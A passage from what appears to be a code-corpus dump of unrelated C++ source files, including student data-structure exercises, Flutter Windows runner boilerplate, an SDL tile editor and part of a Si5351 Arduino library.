endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecords in asceding order of roll number are:\" << endl;\n\t\tNode* currentNode = START;  //step 1 \n\t\twhile (currentNode != NULL)\t//step 2\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl; //step 3\n\t\t\tcurrentNode = currentNode->next;\t\t\t\t\t\t\t\t// step 4\n\t\t}\n\t}\n}\nvoid revtraverse()\n{\n\n\tif (listEmpty())\n\t\tcout << \"\\nRecords in descending order of roll number are:\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords im descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, *curr; \n\tprev = curr = NULL; \n\tcout << \"\\nEnter the roll number of the student whose record you want to seacrh: \"; \n\tint num; \n\tcin >> num; \n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl; \n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl; \n\t\tcout << \"\\nName: \" << curr->name << endl; \n\t}\n}\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nvoid dfs(int node, vector<bool>& visited, vector<vector<int>>& graph) {\n    visited[node] = true;\n    for (int neighbor : graph[node]) {\n        if (!visited[neighbor]) {\n            dfs(neighbor, visited, graph);\n        }\n    }\n}\n\nint countGroups(int N, vector<pair<int, int>>& bridges) {\n    vector<vector<int>> graph(N);\n    for (const auto& bridge : bridges) {\n        int u = bridge.first;\n        int v = bridge.second;\n        graph[u].push_back(v);\n        graph[v].push_back(u);\n    }\n\n    vector<bool> visited(N, false);\n    int groups = 0;\n    for (int i = 0; i < N; ++i) {\n        if (!visited[i]) {\n            dfs(i, visited, graph);\n            groups++;\n        }\n    }\n    return groups;\n}\n\nint main() {\n    int N, M;\n    cin >> N >> M;\n\n    vector<pair<int, int>> bridges(M);\n    for (int i = 0; i < M; ++i) {\n        cin >> bridges[i].first >> bridges[i].second;\n    }\n\n    int distinct_groups = countGroups(N, bridges);\n    cout << distinct_groups << endl;\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n//\u0426\u0435\u043b\u0435\u0432\u043e\u0439 \u043a\u043b\u0430\u0441\u0441 \"\u0421\u0442\u0435\u043a\"\ntemplate <typename T>\nclass Stack {\npublic:\n    Stack() {};\n    virtual void push(T element) = 0;\n    virtual T pop() = 0;\n    virtual bool isEmpty() const = 0;\n    virtual ~Stack() {}\n};\n//\u041a\u043b\u0430\u0441\u0441 \u0443\u0437\u043b\u0430 \u0441\u043f\u0438\u0441\u043a\u0430\ntemplate <typename T>\nclass Node  {\npublic:\n    T data;\n    Node <T>* next;\n    Node(T value) : data(value), next(nullptr) {}\n};\n// \u0410\u0434\u0430\u043f\u0442\u0438\u0440\u0443\u0435\u043c\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \"\u0421\u0432\u044f\u0437\u043d\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a\"\ntemplate <typename T>\nclass List {\nprivate:\n    Node<T>* head;\npublic:\n    List() : head(nullptr) {}\n    void addToEnd(T element) {\n        Node<T>* newNode = new Node<T>(element);\n        if (head == nullptr) {\n            head = newNode;\n        }\n        else {\n            Node<T >* current = head;\n            while (current->next != nullptr) {\n                current = current->next;\n            }\n            current->next = newNode;\n        }\n    }\n    T removeFromEnd() {\n        if (head != nullptr) {\n            if (head->next == nullptr) {\n                T tmp = head->data;\n                delete head;\n                head = nullptr;\n                return tmp;\n            }\n            else {\n                Node<T>* current = head;\n                while (current->next->next != nullptr) {\n                    current = current->next;\n                }\n                T tmp = current->next->data;\n                delete current->next;\n                current->next = nullptr;\n                return tmp;\n            }\n        }\n    }\n    bool isEmpty() const {\n        return head == nullptr;\n    }\n    ~List() {\n        Node<T>* current = head;\n        while (current != nullptr) {\n            Node<T>* temp = current;\n            current = current->next;\n            delete temp;\n        }\n    }\n};\n// \u0410\u0434\u0430\u043f\u0442\u0435\u0440 \u043a\u043b\u0430\u0441\u0441\u0430\ntemplate <typename T> \nclass StackAdapter : public Stack<T> ,private List<T>{\npublic:\n    void push(T element) override \n    {\n        List<T>::addToEnd(element);\n    }\n    T pop() override \n    {\n        return List<T>::removeFromEnd();\n    }\n    bool isEmpty() const override \n    {\n        return List<T>::isEmpty();\n    }\n};\nint main() {\n    Stack<int>* stackint = new StackAdapter<int>();\n    stackint->push(1);\n    stackint->push(2);\n    stackint->push(3);\n    stackint->push(4);\n    while (!stackint->isEmpty()) {\n        cout << stackint->pop() << endl;\n    }\n    Stack<string>* stackstring = new StackAdapter<string>();\n    stackstring->push(\"A\");\n    stackstring->push(\"B\");\n    stackstring->push(\"C\");\n    stackstring->push(\"D\");\n    while (!stackstring->isEmpty()) {\n        cout << stackstring->pop() << endl;\n    }\n\n    \n}\n\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"EditorSpace.h\"\n\nEditorSpace::EditorSpace()\n{\n\tSDL_Log(\"EditorSpace constructed.\");\n}\n\nvoid EditorSpace::Init()\n{\n\twindow = SDL_CreateWindow(\"Tile Editor v0.1\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, SCREENXRES, SCREENYRES, 0);\n\trenderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\n\n\t// Initialise TileGrid\n\ttileGrid.Init();\n\tbuttonPanel.Init();\n\n\tSDL_Log(\"EditorSpace initialised.\");\n}\n\nvoid EditorSpace::Run()\n{\n\twhile (!done) {\n\t\ttimer.ResetTicks();\n\n\t\tInput();\n\t\tUpdate();\n\t\tRender();\n\n\t\t// Delay until frame completes\n\t\tif (timer.GetTicks() < DELTA_TIME) {\n\t\t\tSDL_Delay(DELTA_TIME - timer.GetTicks());\n\t\t}\n\t}\n\n\tQuit();\n}\n\nvoid EditorSpace::Input()\n{\n\twhile (SDL_PollEvent(&event)) {\n\n\t\t// End main loop if quitting\n\t\tif (event.type == SDL_QUIT) {\n\t\t\tdone = true;\n\t\t}\n\t\t\n\t\tSDL_Keycode keyPressed = event.key.keysym.sym;\n\n\t\t// Set to true when key is pressed, do associated thing\n\t\tif (event.type == SDL_KEYDOWN && !event.key.repeat) {\n\t\t\t//SDL_Log(\"[KEY DOWN] time %d; code %d; char %s;\", event.key.timestamp, keyPressed, SDL_GetKeyName(keyPressed));\n\n\t\t\t// Set to true when key is pressed\n\t\t\tswitch (event.key.keysym.sym) {\n\t\t\tcase SDLK_ESCAPE: \n\t\t\t\tdone = true; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_1:\n\t\t\t\tgKeys[SDLK_1] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::raiseHeight); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_2: \n\t\t\t\tgKeys[SDLK_2] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::lowerHeight); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_3: \n\t\t\t\tgKeys[SDLK_3] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::resetHeight); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_4: \n\t\t\t\tgKeys[SDLK_4] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::addCollisionFlag); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_5: \n\t\t\t\tgKeys[SDLK_5] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::rmvCollisionFlag); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_a: \n\t\t\t\tgKeys[SDLK_a] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::addWarpFlag); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_s: \n\t\t\t\tgKeys[SDLK_s] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::rmvWarpFlag); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_q: \n\t\t\t\tgKeys[SDLK_q] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::setEmpty); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_w: \n\t\t\t\tgKeys[SDLK_w] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::setSoil); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_e: \n\t\t\t\tgKeys[SDLK_e] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::setGrass); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_r: \n\t\t\t\tgKeys[SDLK_r] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::setStone); \n\t\t\t\tbreak;\n\t\t\tcase SDLK_t: \n\t\t\t\tgKeys[SDLK_t] = true; \n\t\t\t\ttileGrid.SetTool(tool_enum::setPath); \n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\t// Set to false when key is released\n\t\tif (event.type == SDL_KEYUP) {\n\t\t\t//SDL_Log(\"[KEY UP]time %d; code %d; char %s;\", event.key.timestamp, keyPressed, SDL_GetKeyName(keyPressed));\n\n\t\t\tswitch (event.key.keysym.sym) {\n\t\t\tcase SDLK_1:\n\t\t\t\tgKeys[SDLK_1] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_2:\n\t\t\t\tgKeys[SDLK_2] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_3:\n\t\t\t\tgKeys[SDLK_3] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_4:\n\t\t\t\tgKeys[SDLK_4] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_5:\n\t\t\t\tgKeys[SDLK_5] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_q:\n\t\t\t\tgKeys[SDLK_q] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_w:\n\t\t\t\tgKeys[SDLK_w] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_e:\n\t\t\t\tgKeys[SDLK_e] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_r:\n\t\t\t\tgKeys[SDLK_r] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_t:\n\t\t\t\tgKeys[SDLK_t] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_a:\n\t\t\t\tgKeys[SDLK_a] = false; \n\t\t\t\tbreak;\n\t\t\tcase SDLK_s:\n\t\t\t\tgKeys[SDLK_s] = false; \n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\t// Mouse input\n\t\tif (SDL_GetMouseState(&mPosX, &mPosY)) {\n\t\t\ttileGrid.SetMousePosition(mPosX, mPosY);\n\t\t\tbuttonPanel.SetMousePosition(mPosX, mPosY);\n\t\t}\n\n\t\tswitch (event.type) {\n\t\tcase SDL_MOUSEBUTTONDOWN:\n\t\t\tisClicked = true;\n\t\t\tbreak;\n\t\tcase SDL_MOUSEBUTTONUP:\n\t\t\tisClicked = false;\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nvoid EditorSpace::Update()\n{\n\t// Done every frame\n\ttileGrid.Update(isClicked, MARGIN, REGIONSIZE);\n\n\t// If a button is clicked, receive the tool to use here, set it in tileGrid\n\tint toolToSet = buttonPanel.Update(isClicked);\n\tif (toolToSet != -1) {\n\t\ttileGrid.SetTool(toolToSet);\n\t}\n}\n\nvoid EditorSpace::Render()\n{\n\tSDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);\n\tSDL_RenderClear(renderer);\n\n\t// Container render functions\n\ttileGrid.Render(renderer, MARGIN, REGIONSIZE);\n\tbuttonPanel.Render(renderer);\n\n\tSDL_RenderPresent(renderer);\n}\n\nvoid EditorSpace::Quit()\n{\n\tSDL_Log(\"Quitting application.\");\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n * si5351.cpp - Si5351 library for Arduino\n *\n * Copyright (C) 2015 - 2019 Jason Milldrum <milldrum@gmail.com>\n *                           Dana H. Myers <k6jq@comcast.net>\n *\n * Some tuning algorithms derived from clk-si5351.c in the Linux kernel.\n * Sebastian Hesselbarth <sebastian.hesselbarth@gmail.com>\n * Rabeeh Khoury <rabeeh@solid-run.com>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include <stdint.h>\n\n#include \"Arduino.h\"\n#include \"Wire.h\"\n#include \"si5351.h\"\n\n\n/********************/\n/* Public functions */\n/********************/\n\nSi5351::Si5351(uint8_t i2c_addr):\n\ti2c_bus_addr(i2c_addr)\n{\n\txtal_freq[0] = SI5351_XTAL_FREQ;\n\n\t// Start by using XO ref osc as default for each PLL\n\tplla_ref_osc = SI5351_PLL_INPUT_XO;\n\tpllb_ref_osc = SI5351_PLL_INPUT_XO;\n\tclkin_div = SI5351_CLKIN_DIV_1;\n}\n\n/*\n * init(uint8_t xtal_load_c, uint32_t ref_osc_freq, int32_t corr)\n *\n * Setup communications to the Si5351 and set the crystal\n * load capacitance.\n *\n * xtal_load_c - Crystal load capacitance. Use the SI5351_CRYSTAL_LOAD_*PF\n * defines in the header file\n * xo_freq - Crystal/reference oscillator frequency in 1 Hz increments.\n * Defaults to 25000000 if a 0 is used here.\n * corr - Frequency correction constant in parts-per-billion\n *\n * Returns a boolean that indicates whether a device was found on the desired\n * I2C address.\n *\n */\nbool Si5351::init(uint8_t xtal_load_c, uint32_t xo_freq, int32_t corr)\n{\n\t// Start I2C comms\n\tWire.begin();\n\n\t// Check for a device on the bus, bail out if it is not there\n\tWire.beginTransmission(i2c_bus_addr);\n\tuint8_t reg_val;\n  reg_val = Wire.endTransmission();\n\n\tif(reg_val == 0)\n\t{\n\t\t// Wait for SYS_INIT flag to be clear, indicating that device is ready\n\t\tuint8_t status_reg = 0;\n\t\tdo\n\t\t{\n\t\t\tstatus_reg = si5351_read(SI5351_DEVICE_STATUS);\n\t\t} while (status_reg >> 7 == 1);\n\n\t\t// Set crystal load capacitance\n\t\tsi5351_write(SI5351_CRYSTAL_LOAD, (xtal_load_c & SI5351_CRYSTAL_LOAD_MASK) | 0b00010010);\n\n\t\t// Set up the XO reference frequency\n\t\tif (xo_freq != 0)\n\t\t{\n\t\t\tset_ref_freq(xo_freq, SI5351_PLL_INPUT_XO);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tset_ref_freq(SI5351_XTAL_FREQ, SI5351_PLL_INPUT_XO);\n\t\t}\n\n\t\t// Set the frequency calibration for the XO\n\t\tset_correction(corr, SI5351_PLL_INPUT_XO);\n\n\t\treset();\n\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n/*\n * reset(void)\n *\n * Call to reset the Si5351 to the state initialized by the library.\n *\n */\nvoid Si5351::reset(void)\n{\n\t// Initialize the CLK outputs according to flowchart in datasheet\n\t// First, turn them off\n\tsi5351_write(16, 0x80);\n\tsi5351_write(17, 0x80);\n\tsi5351_write(18, 0x80);\n\tsi5351_write(19, 0x80);\n\tsi5351_write(20, 0x80);\n\tsi5351_write(21, 0x80);\n\tsi5351_write(22, 0x80);\n\tsi5351_write(23, 0x80);\n\n\t// Turn the clocks back on...\n\tsi5351_write(16, 0x0c);\n\tsi5351_write(17, 0x0c);\n\tsi5351_write(18, 0x0c);\n\tsi5351_write(19, 0x0c);\n\tsi5351_write(20, 0x0c);\n\tsi5351_write(21, 0x0c);\n\tsi5351_write(22, 0x0c);\n\tsi5351_write(23, 0x0c);\n\n\t// Set PLLA and PLLB to 800 MHz for automatic tuning\n\tset_pll(SI5351_PLL_FIXED, SI5351_PLLA);\n\tset_pll(SI5351_PLL_FIXED, SI5351_PLLB);\n\n\t// Make PLL to CLK assignments for automatic tuning\n\tpll_assignment[0] = SI5351_PLLA;\n\tpll_assignment[1] = SI5351_PLLA;\n\tpll_assignment[2] = SI5351_PLLA;\n\tpll_assignment[3] = SI5351_PLLA;\n\tpll_assignment[4] = SI5351_PLLA;\n\tpll_assignment[5] = SI5351_PLLA;\n\tpll_assignment[6] = SI5351_PLLB;\n\tpll_assignment[7] = SI5351_PLLB;\n\n\tset_ms_source(SI5351_CLK0, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK1, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK2, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK3, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK4, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK5, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK6, SI5351_PLLB);\n\tset_ms_source(SI5351_CLK7, SI5351_PLLB);\n\n\t// Reset the VCXO param\n\tsi5351_write(SI5351_VXCO_PARAMETERS_LOW, 0);\n\tsi5351_write(SI5351_VXCO_PARAMETERS_MID, 0);\n\tsi5351_write(SI5351_VXCO_PARAMETERS_HIGH, 0);\n\n\t// Then reset the PLLs\n\tpll_reset(SI5351_PLLA);\n\tpll_reset(SI5351_PLLB);\n\n\t// Set initial frequencies\n\tuint8_t i;\n\tfor(i = 0; i < 8; i++)\n\t{\n\t\tclk_freq[i] = 0;\n\t\toutput_enable((enum si5351_clock)i, 0);\n\t\tclk_first_set[i] = false;\n\t}\n}\n\n/*\n * set_freq(uint64_t freq, enum si5351_clock clk)\n *\n * Sets the clock frequency of the specified CLK output.\n * Frequency range of 8 kHz to 150 MHz\n *\n * freq - Output frequency in Hz\n * clk - Clock output\n *   (use the si5351_clock enum)\n *",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <ctime>\nclass Trees\n{\npublic:\n    int topBranch = 0;\n    int middleBranch = 0;\n    std::string name = \"Unknow\";\n    \n    void setNumberMiddleBranch(int &inMiddleBranch)\n    {\n        middleBranch = inMiddleBranch;\n    }\n\n    int getMiddleBranch()\n    {\n        return middleBranch;\n    }\n};\n\nclass ElvenVillage: public Trees\n{\nprivate:\n    \n   \n    Trees** branches = nullptr;\n\npublic:\n    ElvenVillage()\n    {\n        topBranch = rand() % 3 + 3;       \n       \n        branches = new Trees*[topBranch];\n        for (int i = 0; i < topBranch; ++i)\n        {\n            middleBranch = rand() % 2 + 2;\n            branches[i] = new Trees[middleBranch];\n            branches[i]->setNumberMiddleBranch(middleBranch);\n        }\n    }\n\n    void setName()\n    {\n        for (int i = 0; i < topBranch; ++i)\n        {\n            for (int j = 0; j < branches[i]->getMiddleBranch(); ++j)\n            {\n                std::cout << \"Enter the elf's name: \";\n                //std::cin >> 